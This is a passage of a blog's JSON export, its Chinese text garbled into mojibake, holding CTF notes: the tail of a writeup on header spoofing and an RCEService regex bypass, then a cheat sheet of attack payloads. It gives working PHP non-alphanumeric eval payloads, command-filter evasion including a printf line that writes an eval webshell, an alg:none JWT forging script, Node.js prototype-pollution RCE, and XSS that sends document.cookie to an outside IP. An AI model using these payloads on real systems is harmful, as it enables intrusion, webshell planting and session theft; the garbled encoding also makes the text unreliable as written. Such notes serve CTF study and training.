ï¼Œé™åˆ¶ipåœ¨127.0.0.1ï¼ŒPHPå¯¹äºIPçš„å¤„ç†é€šå¸¸æ˜¯é¦–å…ˆåˆ¤æ–­æ˜¯å¦å­˜åœ¨Client-ip,ç„¶ååˆ¤æ–­æ˜¯å¦å­˜åœ¨X-Forwarded-Forï¼Œæœ€ååˆ¤æ–­Remote_attrï¼Œåœ¨è¿™é‡Œåœ¨æŠ¥æ–‡å¤´éƒ¨åŠ ä¸Šclient-ip: 127.0.0.1å¯ä»¥ç›´æ¥ç»•è¿‡,ç„¶åfileå‚æ•°æ˜¯ä¸€æ®µå¾ˆç®€å•çš„é€†è¿ç®— 12345678&lt;?$a=\"flag.php\";for ($i=0;$i&lt;strlen($a);$i++)&#123; $flag.=chr(ord($a[$i])-$i*2);&#125;echo base64_encode($flag);?&gt; æœ€åç”¨php://inputç»•è¿‡ä¸€ä¸‹2333å‚æ•°å¾—åˆ°flagã€‚ [FBCTF2019]RCEServiceè¦æ±‚ç”¨jsonæ ¼å¼è¾“å…¥å‘½ä»¤{&quot;cmd&quot;:&quot;ls&quot;},å¾—åˆ°index.phpä½†æ˜¯ä¸èƒ½è¯»å–ã€‚ç„¶åç™¾åº¦ä¸€ä¸‹ï¼Œä»–ä»¬éƒ½è¯´å…ˆçŸ¥å¯ä»¥æ‹¿åˆ°æºç ï¼Œå‘ç°æ­£åˆ™ä½¿ç”¨çš„æ˜¯preg_matchï¼Œå¯ä»¥ä½¿ç”¨å¤šè¡Œç»•è¿‡ã€‚ å¤šè¡Œç»•è¿‡ æºç ä¸­é€šè¿‡putenvè®¾ç½®äº†PATHç¯å¢ƒå˜é‡ï¼ŒPATHç¯å¢ƒå˜é‡å­˜æ”¾çš„æ˜¯å‘½ä»¤æœç´¢è·¯å¾„ï¼Œæ‰€ä»¥åªèƒ½é€šè¿‡ç»å¯¹è·¯å¾„æ‹¿åˆ°å‘½ä»¤ï¼Œ/bin/catã€‚ 1cmd=&#123;%0A&quot;cmd&quot;:%20&quot;/bin/cat%20/home/rceservice/flag&quot;%0A&#125;","categories":[{"name":"writeup","slug":"writeup","permalink":"http://yoursite.com/categories/writeup/"}],"tags":[]},{"title":"ctf","slug":"ctfæ€»ç»“","date":"2019-09-09T16:00:00.000Z","updated":"2020-11-28T12:59:35.732Z","comments":true,"path":"2019/09/10/ctfæ€»ç»“/","link":"","permalink":"http://yoursite.com/2019/09/10/ctfæ€»ç»“/","excerpt":"","text":"CTFmd5å¸¸è§ç»•è¿‡å¼ºæ¯”è¾ƒç»•è¿‡æ•°ç»„ç»•è¿‡ â€‹ md5ç¢°åˆ°æ•°ç»„æ•°æ®æ—¶è¿”å›nullï¼Œnull===nulllç»•è¿‡ã€‚ md5ç¢°æ’ â€‹ fastcoll å¼±æ¯”è¾ƒç»•è¿‡åˆ©ç”¨ç§‘å­¦è®¡æ•°æ³•0e+ä»»ä½•æ•°å­—éƒ½ä¸º0ã€‚ ä»¥ä¸‹å€¼åœ¨md5åŠ å¯†åä»¥0Eå¼€å¤´ï¼š 123456QNKCDZO240610708s878926199as155964671as214587387as214587387a ä»¥ä¸‹å€¼åœ¨sha1åŠ å¯†åä»¥0Eå¼€å¤´ï¼š 1234sha1(â€˜aaroZmOkâ€™)sha1(â€˜aaK1STfYâ€™)sha1(â€˜aaO8zKZFâ€™)sha1(â€˜aa3OFF9mâ€™) ä»¥ä¸‹å€¼åŠ å¯†å‰åå¼±æ¯”è¾ƒç›¸ç­‰ 10e215962017 evalå‘½ä»¤æ‰§è¡Œæ— æ•°å­—å­—æ¯1234&lt;?phpif(!preg_match('/[a-z0-9]/is',$_GET['shell'])) &#123; eval($_GET['shell']);&#125; payload php5-php7.0 1shell=$_=\"`&#123;&#123;&#123;\"^\"?&lt;&gt;/\";$&#123;$_&#125;[_]($&#123;$_&#125;[__]);&amp;_=assert&amp;__=phpinfo()//$_=_GET å¦‚æœæŠŠä¸‹åˆ’çº¿ä¹Ÿbanäº†ï¼Œè¿˜èƒ½ä½¿ç”¨ä¸å¯è§å­—ç¬¦æˆ–è€…+æˆ–è€…ä¸­æ–‡æ¥åšå˜é‡åã€‚ php7.0ä¹‹åBANäº†assertï¼Œä¸è¿‡å¯ä»¥ç”¨å–åæ¥è°ƒç”¨å‡½æ•°ã€‚ 1shell=(~%8F%97%8F%96%91%99%90)();//phpinfo(); å€¼å¾—ä¸€æçš„æ˜¯eval å±äºPHPè¯­æ³•æ„é€ çš„ä¸€éƒ¨åˆ†ï¼Œå¹¶ä¸æ˜¯ä¸€ä¸ªå‡½æ•°ï¼Œæ‰€ä»¥ä¸èƒ½é€šè¿‡å˜é‡å‡½æ•°çš„å½¢å¼æ¥è°ƒç”¨ï¼ˆè™½ç„¶å®ƒç¡®å®åƒæäº†å‡½æ•°åŸå‹ï¼‰ã€‚è¿™æ ·çš„è¯­æ³•æ„é€ è¿˜åŒ…æ‹¬ï¼šechoï¼Œprintï¼Œunset()ï¼Œisset()ï¼Œempty()ï¼Œincludeï¼Œrequireã€‚ readfie(end(scandir(.))) 1((%8d%9c%97%a0%88%8d%97%8d%9c%a0%a0)^(%9a%97%9b%88%a0%9a%9b%9b%8d%9c%9a)^(%9b%9c%9c%a0%88%9b%9c%9c%9c%a0%a0)^(%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff))(((%a0%97%8d)^(%9a%9a%9b)^(%a0%9c%8d)^(%ff%ff%ff))(((%8d%a0%88%97%8d%9b%9c)^(%9a%9c%8d%9a%9b%9a%8d)^(%9b%a0%9b%9c%8d%97%9c)^(%ff%ff%ff%ff%ff%ff%ff))(%d1^%ff))); preg_matchç»•è¿‡æ•°ç»„ç»•è¿‡å½“preg_matchå¤„ç†æ•°ç»„æ—¶ä¼šè¿”å›flaseã€‚ æ¢è¡Œç¬¦æ­£åˆ™.ä¸ä¼šåŒ¹é…æ¢è¡Œç¬¦ åœ¨å•è¡ŒåŒ¹é…ä¸‹ï¼Œ$ä¸ä¼šåŒ¹é…\\næˆ–è€…\\rã€‚ PCREå›æº¯æ¬¡æ•°é™åˆ¶https://security.bytedance.com/index/ PHPçš„PCREé‡‡ç”¨NFAæ­£åˆ™å¼•æ“ NFAï¼šä»èµ·å§‹çŠ¶æ€å¼€å§‹ï¼Œä¸€ä¸ªå­—ç¬¦ä¸€ä¸ªå­—ç¬¦åœ°è¯»å–è¾“å…¥ä¸²ï¼Œå¹¶ä¸æ­£åˆ™è¡¨è¾¾å¼è¿›è¡ŒåŒ¹é…ï¼Œå¦‚æœåŒ¹é…ä¸ä¸Šï¼Œåˆ™è¿›è¡Œå›æº¯ï¼Œå°è¯•å…¶ä»–çŠ¶æ€ NFAå¼•æ“ä¼šè®¾ç½®ä¸€ä¸ªæœ€å¤§å›æº¯æ¬¡æ•°ï¼Œå¦‚æœè¶…è¿‡è¿™ä¸ªæ¬¡æ•°å°±è¿”å›FLASE,æ‰€ä»¥æˆ‘ä»¬å¯å‘é€è¶…é•¿å­—ç¬¦ä¸²ï¼Œä½¿æ­£åˆ™è¿”å›å¤±è´¥ã€‚ 1BytesIO(b&apos;aaa&lt;?php eval($_POST[txt]);//&apos; + b&apos;a&apos; * 1000000) Linuxå‘½ä»¤æ‰§è¡Œå‚è€ƒæ–‡ç« https://blog.zeddyu.info/2019/01/17/ å¸¸ç”¨é€šé…ç¬¦12?åŒ¹é…ä¸€ä¸ªä»»æ„å­—ç¬¦*åŒ¹é…ä»»æ„å­—ç¬¦ ç©ºæ ¼ç»•è¿‡$IFSåˆ†éš”ç¬¦ 1$&#123;IFS&#125;,$IFS$9 IFSè¡¨ç¤ºlinuxä¸‹çš„åˆ†éš”ç¬¦ï¼Œä½†æ˜¯ç›´æ¥ä½¿ç”¨$IFSä¼šå¯¼è‡´æ­§ä¹‰ï¼Œæ¯”å¦‚cat$IFSfileï¼Œè¿™æ ·bashä¼šå°†æ•´ä¸ªIFSfileå½“æˆå˜é‡åï¼Œå¯¼è‡´æ— æ³•è¯»å–åˆ°fileæ–‡ä»¶ï¼Œé€šå¸¸æˆ‘ä»¬ç”¨${IFS}æ¥ç¡®å®šå˜é‡åï¼Œæˆ–è€…ä½¿ç”¨$IFS$9,$9ä¸ºå½“å‰ç³»ç»Ÿshellè¿›ç¨‹çš„ç¬¬ä¹ä¸ªå‚æ•°ï¼Œé»˜è®¤ä¸ºç©ºï¼Œåœ¨è¿™é‡Œèµ·åˆ°ä¸€ä¸ªéš”æ–­ä½œç”¨ã€‚ èŠ±æ‹¬å·æ‰©å±•{OS_COMMAND,ARGUMENT} 1&#123;cat,file&#125; å˜é‡ç»•è¿‡ 12x='cat\\x20flag'&amp;&amp;$xx='cat\\x09flag'&amp;&amp;$x \\x20å’Œ\\x09åˆ†åˆ«è¡¨ç¤ºç©ºæ ¼ä¸tabã€‚ å‘½ä»¤åˆ†éš”ç¬¦linuxä¸­ï¼š%0a ã€%0d ã€; ã€&amp; ã€| ã€&amp;&amp;ã€|| windowsä¸­ï¼š%0aã€&amp;ã€|ã€%1aï¼ˆä¸€ä¸ªç¥å¥‡çš„è§’è‰²ï¼Œä½œä¸º.batæ–‡ä»¶ä¸­çš„å‘½ä»¤åˆ†éš”ç¬¦ï¼‰ é»‘åå•ç»•è¿‡1234567891011121314151617181920å˜é‡æ‹¼æ¥a=l;b=s;$a$b$@ç»•è¿‡l$@så•åŒå¼•å·ç»•è¿‡\"l\"såæ–œæ ç»•è¿‡l\\så·²æœ‰èµ„æºæˆªå–ls $&#123;PATH:9:1&#125;$&#123;PATH:11:1&#125;nl $&#123;PATH:14:1&#125;$&#123;PATH:21:1&#125;$PS2= &gt;$ps4= +ç¼–ç ç»•è¿‡echo \"å‘½ä»¤base64ç¼–ç \"|base64 -d|bashecho \"hexç¼–ç \" | xxd -r -p|bash$(printf \"\\154\\163\")å…«è¿›åˆ¶ç¼–ç &#123;printf,\"\\74\\77\\160\\150\\160\\40\\100\\145\\166\\141\\154\\50\\44\\137\\120\\117\\123\\124\\133\\47\\143\\47\\135\\51\\73\\77\\76\"&#125; &gt;&gt; 1.phpå†™shellè¿‡æ»¤æ–œæ / å¯ä»¥ä½¿ç”¨ cd .. jwtå¸¸è§æ¼æ´https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/JSON%20Web%20Token JWTç”±ä¸‰ä¸ªéƒ¨åˆ†æ„æˆï¼š header:å­˜æ”¾å£°æ˜ç±»å‹type(JWT)ï¼ŒåŠ å¯†ç®—æ³•alg(none,HS256ç­‰ç­‰) è·è½½ï¼šå°±æ˜¯å­˜æ”¾æœ‰æ•ˆä¿¡æ¯(æ ‡å‡†ä¸­æ³¨å†Œçš„å£°æ˜ï¼Œå…¬å…±å£°æ˜ï¼Œç§æœ‰å£°æ˜)ï¼Œä¸€èˆ¬ç”¨æ¥å­˜æ”¾éœ€è¦ä¼ é€’çš„ä¿¡æ¯(ç”¨æˆ·åå¯†ç )ã€‚ ç­¾åï¼šå°†å¤´éƒ¨ä¸è·è½½çš„ä¿¡æ¯base64åŠ å¯†å¹¶ä½¿ç”¨.è¿æ¥ï¼Œå†é€šè¿‡headerä¸­çš„åŠ å¯†æ–¹å¼ä¸secretç»„åˆåŠ å¯†ã€‚ æœ€ç»ˆå®Œæ•´çš„JWTæ˜¯ç”±å¤´éƒ¨çš„base64.è·è½½çš„base64.ä¸ç­¾åçš„ç»„åˆã€‚ æ— åŠ å¯†ç®—æ³•JWTç”Ÿæˆ 12345678910111213141516171819import jwtimport timeimport base64import jsonheaders=&#123;'type':'jwt','alg':\"none\"&#125;payload=&#123;'iat':1587378820,'username':'admin','password':'123','secretid':[]&#125;he=json.dumps(headers)pa=json.dumps(payload)a=base64.b64encode(he.encode('utf-8')).decode('utf-8')b=base64.b64encode(pa.encode('utf-8')).decode('utf-8')print(a+'.'+b+'.') rs256-hs256å¦‚æœè·å–åˆ°å…¬é’¥pkï¼Œå¯ä»¥ä½¿ç”¨HS-256ç®—æ³•ç”¨å…¬é’¥å¯¹æ•°æ®ç­¾åï¼Œpy json_decode å®˜æ–¹æ‰‹å†Œä¸Šè¯´ï¼Œjson_encodeæ”¯æŒutf-8ç¼–ç çš„æ•°æ®ï¼Œé‚£ä¹Ÿå°±æ˜¯æ”¯æŒunicodeç¼–ç ã€‚ Ruby ERBæ¨¡æ¿æ³¨å…¥&lt;%= 7 * 7 %&gt;è¿™ç§å¥æ³•å¯ä»¥æ‰§è¡Œrubyè¯­å¥ nodejsåŸå‹é“¾æ±¡æŸ“kibana-RCEhttps://xz.aliyun.com/t/6755 Nodejsåœ¨ä½¿ç”¨child_processå»ºç«‹å­è¿›ç¨‹æ—¶ï¼Œä¼šå°†optionså¯¹è±¡çš„envå±æ€§ä½œä¸ºç¯å¢ƒå˜é‡åŠ è½½åˆ°/proc/self/environä¸­ï¼Œä½†æ˜¯optionså¯¹è±¡é»˜è®¤ä¸ºç©ºï¼Œè¿™å°±å¯¼è‡´äº†åªè¦æ±¡æŸ“Object.envï¼Œå°±èƒ½æ§åˆ¶/proc/self/environçš„å€¼ã€‚ å½“nodeç‰ˆæœ¬&gt;v8.0.0ä»¥åæ”¯æŒè¿è¡Œnodeæ—¶å¢åŠ ä¸€ä¸ªå‘½ä»¤è¡Œå‚æ•°NODE_OPTIONSï¼Œå®ƒèƒ½å¤ŸåŒ…å«ä¸€ä¸ªjsè„šæœ¬ï¼Œç›¸å½“äºincludeï¼Œè€ŒNODE_OPTIONSæ˜¯ä½œä¸ºç¯å¢ƒå˜é‡åŠ è½½çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥é€šè¿‡æ±¡æŸ“NODE_OPTIONSçš„å€¼ï¼Œæ¥åŠ è½½/proc/self/environï¼Œæ‰§è¡Œæˆ‘ä»¬ä¹‹å‰æ±¡æŸ“çš„options.envçš„å€¼ã€‚ æ–‡ç« ä¸­çš„payload 12345678// test.jsproc = require(&apos;child_process&apos;);var aa = &#123;&#125;aa.__proto__.env = &#123;&apos;AAAA&apos;:&apos;console.log(process.mainModule.require(&apos;child_process&apos;).execSync(&apos;cat /flag&apos;).toString())//&apos;,&apos;NODE_OPTIONS&apos;:&apos;--require /proc/self/environ&apos;&#125; --require -rproc.fork(&apos;./function.js&apos;);//function.jsconsole.log(&apos;this is func&apos;) åˆ©ç”¨æ¡ä»¶ï¼šnode&gt;v8.0ï¼Œjsä½¿ç”¨child_processåˆ›å»ºå­è¿›ç¨‹ã€‚ 1$&#123;0&#125;&lt;&lt;&lt;\\$\\&apos;\\\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$(())$(())$(())$&#123;##&#125;$&#123;##&#125;$&#123;##&#125;$(())))\\\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$(())$(())$(())$&#123;##&#125;$&#123;##&#125;$(())$&#123;##&#125;))\\\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$(())$&#123;##&#125;$(())$(())$(())$&#123;##&#125;$&#123;##&#125;))\\\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$(())$(())$&#123;##&#125;$(())$&#123;##&#125;$&#123;##&#125;$(())))\\&apos;&lt;&lt;&lt;\\$\\&apos;\\\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$(())$(())$&#123;##&#125;$(())$(())$(())$&#123;##&#125;))\\\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$(())$(())$(())$&#123;##&#125;$&#123;##&#125;$&#123;##&#125;$&#123;##&#125;))\\\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$(())$(())$&#123;##&#125;$(())$&#123;##&#125;$&#123;##&#125;$(())))\\\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$(())$(())$&#123;##&#125;$&#123;##&#125;$&#123;##&#125;$(())$&#123;##&#125;))\\\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$(())$&#123;##&#125;$(())$(())$(())))\\\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$&#123;##&#125;$&#123;##&#125;$&#123;##&#125;$(())$&#123;##&#125;))\\\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$(())$&#123;##&#125;$(())$(())$(())))\\\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$(())$(())$&#123;##&#125;$&#123;##&#125;$(())$(())))\\\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$&#123;##&#125;$&#123;##&#125;$&#123;##&#125;$(())$&#123;##&#125;))\\\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$&#123;##&#125;$&#123;##&#125;$(())$(())$(())))\\\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$(())$&#123;##&#125;$(())$(())$&#123;##&#125;$(())$(())))\\\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$(())$&#123;##&#125;$(())$&#123;##&#125;$(())$&#123;##&#125;$(())))\\\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$(())$&#123;##&#125;$(())$(())$&#123;##&#125;$(())$(())))\\&apos; XSSç»•è¿‡å§¿åŠ¿å°æ‹¬å·è¿‡æ»¤äº†å¯ä»¥ç”¨åå¼•å·ä»£æ›¿ 1&lt;script&gt;setTimeout`alert\\u0028document.cookie\\u0029`;&lt;/script&gt; 1&lt;svg&gt;&lt;script&gt;eval(&quot;window.location.href=&apos;http://8.129.69.85:2333&apos;&quot;)&lt;/script&gt; 1&lt;svg&gt;&lt;script&gt;eval&amp;#40;&amp;#34;&amp;#119;&amp;#105;&amp;#110;&amp;#100;&amp;#111;&amp;#119;&amp;#46;&amp;#108;&amp;#111;&amp;#99;&amp;#97;&amp;#116;&amp;#105;&amp;#111;&amp;#110;&amp;#46;&amp;#104;&amp;#114;&amp;#101;&amp;#102;&amp;#61;&amp;#39;&amp;#104;&amp;#116;&amp;#116;&amp;#112;&amp;#58;&amp;#47;&amp;#47;&amp;#56;&amp;#46;&amp;#49;&amp;#50;&amp;#57;&amp;#46;&amp;#54;&amp;#57;&amp;#46;&amp;#56;&amp;#53;&amp;#58;&amp;#50;&amp;#51;&amp;#51;&amp;#51;&amp;#63;&amp;#99;&amp;#111;&amp;#111;&amp;#107;&amp;#105;&amp;#101;&amp;#61;&amp;#39;&amp;#43;&amp;#100;&amp;#111;&amp;#99;&amp;#117;&amp;#109;&amp;#101;&amp;#110;&amp;#116;&amp;#46;&amp;#99;&amp;#111;&amp;#111;&amp;#107;&amp;#105;&amp;#101;&amp;#34;&amp;#41;&lt;/script&gt; http://web.node3.buuoj.cn/post/35f5dcee21e6bcc461f6021ba07f8bba.html http://web.node3.buuoj.cn/post/97b32351779495478f94dc5ff9537353.html htaccessç»•è¿‡å§¿åŠ¿12345678910111213141516AddType application/x-httpd-ph\\p .aphp_value auto_append_file .htaccess append or prepend#&lt;?php phpinfo();# .htaccessphp_flag zend.multibyte 1php_value zend.script_encoding &quot;UTF-7&quot; # index.php+ADw?php phpinfo()+ADs +AF8AXw-halt+AF8-compiler()+ADså¯ä»¥è½¬ä¹‰æ¢è¡Œç¬¦ï¼Œä»è€Œè¾¾åˆ°å¤šè¡Œæ³¨é‡Š#\\","categories":[{"name":"trick","slug":"trick","permalink":"http://yoursite.com/categories/trick/"}],"tags":[]}],"categories":[{"name":"ç¥¥äº‘æ¯","slug":"ç¥¥äº‘æ¯","permalink":"http://yoursite.com/categories/ç¥¥äº‘æ¯/"},{"name":"ä¸“é¢˜  writeup","slug":"ä¸“é¢˜-writeup","permalink":"http://yoursite.com/categories/ä¸“é¢˜-writeup/"},{"name":"Nu1lCtf","slug":"Nu1lCtf","permalink":"http://yoursite.com/categories/Nu1lCtf/"},{"name":"è¥¿æ¹–è®ºå‰‘","slug":"è¥¿æ¹–è®ºå‰‘","permalink":"http://yoursite.com/categories/è¥¿æ¹–è®ºå‰‘/"},{"name":"writeup","slug":"writeup","permalink":"http://yoursite.com/categories/writeup/"},{"name":"æ¼æ´å¤ç°","slug":"æ¼æ´å¤ç°","permalink":"http://yoursite.com/categories/æ¼æ´å¤ç°/"},{"name":"ä¸“é¢˜  Python","slug":"ä¸“é¢˜-Python","permalink":"http://yoursite.com/categories/ä¸“é¢˜-Python/"},{"name":"XXE","slug":"XXE","permalink":"http://yoursite.com/categories/XXE/"},{"name":"pdo","slug":"pdo","permalink":"http://yoursite.com/categories/pdo/"},{"name":"åè®®å­¦ä¹ ","slug":"åè®®å­¦ä¹ ","permalink":"http://yoursite.com/categories/åè®®å­¦ä¹ /"},{"name":"trick","slug":"trick","permalink":"http://yoursite.com/categories/trick/"}],"tags":[]}